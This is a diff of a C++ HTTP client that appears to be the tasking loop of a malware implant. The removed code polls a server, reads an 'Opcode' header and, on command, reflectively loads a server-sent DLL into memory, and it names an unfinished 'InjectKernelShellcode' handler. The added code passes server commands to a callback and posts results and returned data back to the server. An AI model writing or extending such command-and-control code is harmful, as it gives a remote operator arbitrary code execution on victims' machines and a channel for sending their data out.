@@ -1,89 +1,35 @@
 #include "pch.h"
 #include "HttpClient.h"
 
-DWORD WINAPI HttpClient::FetchFromServerLoop(LPVOID Seconds) {
-    for (;;) {
-        FetchFromServer();
-        ::Sleep(*(DWORD*)Seconds * 1000);
-    }
-}
-
-void HttpClient::FetchFromServer() {
+httplib::Error HttpClient::FetchFromServer() {
     try {
-        net::io_context io_context;
+        if (auto response = Client.Get(".")) {
+        	
+            std::string returnedData = "";
+            CHAR resultOpcode = KeepAliveOpcode;            
+        	
+            if (response->status == 200) {
+                DWORD ServerOC = static_cast<DWORD>((*(response->headers.find("Opcode")->second.c_str())) - 48);
 
-        tcp::resolver resolver(io_context);
+            	if (ServerOC != KeepAliveOpcode) {
 
-        beast::tcp_stream stream(io_context);
-
-        auto const results = resolver.resolve("127.0.0.1", "1230");
-
-        // Make the connection on the IP address we get from a lookup
-        stream.connect(results);
-
-        //for (;;) {
-
-            // Set up an HTTP GET request message
-        http::request<http::string_body> req{ http::verb::get, ".", 11 };
-
-        //req.set(http::field::keep_alive);
-        //
-        // Send the HTTP request to the remote host
-        http::write(stream, req);
-
-        // This dataFromServer is used for reading and must be persisted
-        beast::flat_buffer buffer;
-
-        // Declare a container to hold the response
-        http::response<http::dynamic_body> res;
-
-        // Receive the HTTP response
-        http::read(stream, buffer, res);
-
-
-        for (auto const& field : res) {
-            if (field.name_string() == "Opcode") {
-                size_t bodysSize = res.body().size();
-
-                void* dataFromServer = VirtualAlloc(NULL, bodysSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-
-                buffer_copy(boost::asio::buffer((char*)dataFromServer, bodysSize), res.body().data(), bodysSize);
-
-                int opcode;
-                std::from_chars(field.value().data(), field.value().data() + field.value().size(), opcode);
-
-                BYTE* outputBuffer = nullptr;
-                size_t outputBufferSize = 0;
-                if (RequestHandler(static_cast<ServerOpcode>(opcode), dataFromServer, bodysSize, outputBuffer, &outputBufferSize)) {
-                    // TODO: Send a response to the server
-                }
-
-                ::VirtualFree(dataFromServer, bodysSize, MEM_RELEASE);
-                break;
-            }
-            //}
+                    resultOpcode = static_cast<CHAR>(ClientOpcode::Failure);
+ 
+                    if (this->CallbackFunction) {
+                        if (this->CallbackFunction(static_cast<ServerOpcode>(ServerOC), (PVOID)response->body.c_str(), response->body.length(), &returnedData))
+                            resultOpcode = static_cast<CHAR>(ClientOpcode::Success);
+                        if (returnedData.length() > 0)
+                            resultOpcode = static_cast<CHAR>(ClientOpcode::SuccessWithReturnedData);
+                    }
+            	}                
+            }      	
+            httplib::Params postParameters{ { "Opcode", std::string(1, resultOpcode) }, {"Returned-Data", returnedData} };
+            auto post = Client.Post(".", postParameters);
+            return httplib::Error::Success;
         }
+    	else return response.error();        
     }
     catch (...) {
 
     }
-}
-
-bool HttpClient::RequestHandler(ServerOpcode opcode, const void* inputBuffer, size_t inputBufferLength, void* outputBuffer, size_t* outputBufferLength) {
-    bool success = false;
-    PVOID hModule;
-
-    switch (opcode)
-    {
-    case ServerOpcode::LoadLibraryReflectively:
-        hModule = ReflectiveLibraryLoader::MemoryLoadLibrary((PVOID)inputBuffer, inputBufferLength);
-        if (hModule) success = true;
-        break;
-    case ServerOpcode::InjectKernelShellcode:
-        // TODO
-        break;
-    default:
-        break;
-    }
-    return success;
 }
